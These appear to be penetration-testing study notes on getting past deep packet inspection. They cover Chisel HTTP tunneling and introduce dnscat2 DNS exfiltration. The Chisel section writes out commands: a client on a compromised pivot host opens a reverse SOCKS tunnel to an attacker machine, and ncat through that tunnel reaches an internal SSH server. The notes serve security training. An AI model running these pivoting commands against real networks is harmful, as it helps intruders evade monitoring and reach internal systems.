# Tunneling Through Deep Packet Inspection

- <https://en.wikipedia.org/wiki/Deep_packet_inspection>



HTTP and DNS tunneling strategies may be useful when trying to traverse more hardened network environments, in particular to bypass systems that perform deep packet inspection, or other network traffic analysis.

We performed HTTP tunneling with Chisel, and  - and experienced some of the pros and cons of both.







## HTTP Tunneling with Chisel

- <https://github.com/jpillora/chisel/releases>

- OSCP:
	- <https://github.com/jpillora/chisel/releases/tag/v1.7.7>
	- <https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz>


Is an HTTP tunneling tool that encapsulates our data stream within HTTP.

It also uses the SSH protocol within the tunnel so our data will be encrypted.

Chisel uses a client/server model.
A Chisel server must be set up, which can accept a connection from the Chisel client. 
Various port forwarding options are available depending on the server and client configurations.

One useful option is reverse port forwarding, which is similar to SSH remote port forwarding.

Older tools like `HTTPTunnel` offer similar tunneling functionality, but lack the flexibility and cross-platform capabilities of Chisel.
- <http://http-tunnel.sourceforge.net/>


The Chisel server and client are actually run from the same binary, they're just initialized with either server or client as the first argument.

If our target host is running a different operating system or architecture, we have to download and use the compiled binary for that specific operating system and architecture from the Chisel Github releases page.

Once we have the Chisel binary on both our Kali machine and the target, we can run them.


Example:
create a reverse tunnel using `chisel, then use this tunnel to log in to an SSH server on TARGET 2  within the internal network.
Using only HTTP-formatted traffic to and from the compromised TARGET 1 pivot server.


1. On ATTACKER MACHINE:
run a Chisel server on our Kali machine, which will accept a connection from a Chisel client running on TARGET 1

```
# Run the chisel server
chisel server --port 8080 --reverse


## run tcpdump on our Kali machine to log incoming traffic
sudo tcpdump -nvvvXi tun0 tcp port 8080
# Output:
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```




2. On TARGET 1
```
chisel client [ATTACKER]:8080 R:socks
chisel client [ATTACKER]:8080 R:socks > /dev/null 2>&1 &
```

The R prefix specifies a reverse tunnel using a socks proxy (which is bound to port 1080 by default)




3. On ATTACKER
Pass an Ncat command to ProxyCommand. The command we construct tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent the SSH command host and port values, which SSH will fill in before running the command.

```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' 
database_admin@[TARGET 2]
```










### John Hammond tutorial
- <https://www.youtube.com/watch?v=pbR_BNSOaMk>


1. ATTACKER
```
chisel server --socks5 --reverse
# Output:
...
Fingerprint ...
Listening on http://0.0.0.0:8080
...
```


2 TARGET 1 (pivot)

2.a
```
# forward port 80 on TARGET 2 to port 8000 on ATTACKER
./chisel client --fingerprint [FINGERPRINT FROM CHISEL SERVER] [ATTACKER IP]:8080 R:8000:[TARGET 2]:80 
```
On port 8000 on ATTACKER MACHINE is mapped to TARGET 2 port 80


2.b
```
# access all ports
./chisel client --fingerprint [FINGERPRINT FROM CHISEL SERVER] [ATTACKER IP]:8080 R:socks
```

The Chisel server on our Kali machine will listen on TCP port 1080, a SOCKS proxy port. We have to use use `proxychais`













## DNS tunneling with dnscat2

- <https://thekelleys.org.uk/dnsmasq/doc.html>



We can use dnscat2 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records.
A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.






Thinking about exfiltration techniques (like DNS tunneling) may seem to present a "chicken or the egg" problem.3 How do we get the DNS tunneling client onto a host if we don't have command execution? Exfiltration is simply a tool we'll use to transfer data. It should be coupled with an exploitation vector that provides access to the target network.




















